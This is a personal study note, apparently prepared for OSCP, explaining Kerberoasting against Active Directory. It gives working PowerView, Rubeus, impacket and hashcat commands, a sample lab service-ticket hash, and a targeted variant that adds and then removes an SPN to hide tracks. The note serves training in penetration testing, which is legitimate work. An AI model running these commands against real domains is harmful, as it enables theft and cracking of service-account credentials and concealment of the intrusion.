---
aliases:
  - Active Directory Password Attacks - Kerberoasting
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - active_directory
  - ad
  - adds
  - password_attack
  - kerberoasting
author: Mehdi N Tehrani
creat_date: 2024-01-07
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Kerberoasting
When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN. Checks are only done when the ticket is provided to the service. If the SPN's password hash is weak, we can crack it and obtain access to the service account.
The attack comprises of sending a request to KDC to obtain a `TGS-REP` which contains the service ticket hash. 

However, if the SPN runs in the context of a *computer account*, a [managed service account](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), or a [group-managed service account](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the _krbtgt_ user account which acts as service account for the KDC. 

Therefore, our chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.

## Targeted Kerberoasting
#targeted_kerberoasting
If we have enough privileges over an account, instead of resetting their password, we could set an SPN for the user, kerberoast the account, and crack the password hash, and then remove the SPN to clear any tracks and avoid potential vulnerabilities.

# Identify
#powerview 
```powershell
Get-NetUser -SPN
```
# Attack
We can use **Rubeus** on Windows or **impacket** on linux for this attack

## Rubeus
#rubeus
Identifies SPN accounts the current user can view in the domain and tries to obtain service tickets for them from KDC. 

```cmd
./Rubeus kerberoast /outfile:%filename%
```

```
hashcat -m 13100 hashes.kerberos $wordlist -r $rules
```

## impacket
#impacket #get_user_spns
```sh
sudo impacket-GetUserSPNs -request -dc-ip $dc_ip $domain/$user -outputfile $outfile
```

Output:
```
$krb5tgs$23$*pete$CORP.COM$corp.com/pete*$b5635557b10b9a4aab930c6183fc67b8$39e48eb2b7da1781457e051e44c184c7a39aebf23d3f156942771b89e9b19cfe792cec1a13fbe9ea3de9cc3b5853e9d31046f590f58845bcb2036547b44f55d3f15fbb9b4a80173a28f852c1f2de2fd2d3e0ddc7dba63c57492000433162bbaaf625c8ac501d6506a7c5e93166e5861c1c2bec60db46852f13be08bed4d3fb95ae3594990792dc9ac5530aa924d0fad8363077d1ddf58c2206a769281add86d757cad8caa77cf790f080f2ffc2c4eaca1d30e084b0a396bde85fc3e1afbd7c8a68a98146f3dd8bfb953e6e6df790142ba6b761f7a383f791c1047023323da3ca15595837fa9f757e85ebb5da743fed0b70ff8f4f24b58309caf9e43604c3c2d48748c1893ef2c01232ca234bafbc1bc428966727eed3ea5926802b31c5d7365b361d0bfbb6fab823c3b09435c7cb20c08964dadc316fc63f9507b23625706c4a5d29060f0c866f26f17d9e6956c8f005e03e710309023e3710c72634cde7e2f9b7502161c7985a9bc2bea7bc8b71ea6d8bef7645cbbe56a4f771c0c172bcd2d441a32cfb216aa712da8dd2bfaee3142aea12fe38f7dd3b08840a404de53f1c4d79d7fc712a0c6251d39e0e3dd29223d8265d4df92142b893b3aa8783914eae0a0bc3568e4a524060968a6a9b876008f3f03f3725a9495d65c6ff9de74236bc3be97f8a8517172595068eaffae916c75ed2e20d2a14795b0d95c17c281e8001234cc6d2da8abb9a61bf8be3aa6d30719211949ccbbe4962762f50228d666ec31e7b7c428562fd5871df5126b24d8b76569b7d1a3624a851afbc65612c9f1ddd6e146f26ed1c48368805762a54d89f0a1ff4b5953550575a51b11d0eb8cbbd52fd0784bbe497234e67b42735cef4e45bc253849dbc7612747998cd9500c7a1e02edcb4761c854dc84fc65efb6563d896a645e51faad08a265d1a060c6c1b9c061898cf1a5ce8e77aaf5d904085f967977fc37d404b1a79e763ce8ebc14dd872eeaf1773b65e796824a176fd0779d68f0e52276321d1b0c8ff3ee2c6ada3d746cd987c39fa5ba7bf04df03dcd814e30a95b601c459cf9395585d1fa9d927d6bac0906e32dcf05d25b1e509f5a48d2df7f7c35d68d21f7ec8885b169b0c7ab9335c1df82f37d03fc3719720ee7ec10cdd0510b0437cc26c6032840f7d7653b4a82b4df26d21fea78fdd1018302c91b6a8423eb86ad077f8bccfe627b9cca9f86af1dbe4fcdec76c8f99a1ef29de9a847851b18cacc198283d9f7299176121f81050dc08f2c4507eaccd215ed7edaab99b0084368771fbc799ff1f8935d5b1341d6fa7b0f032af636cbc24b5d765ed3
```
# Decrypt
#hashcat 
```sh
hashcat -m 13100 $hashes_file $wordlsit -r $rules
```
example
```sh
hashcat -m 13100 hashes.kerberos /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```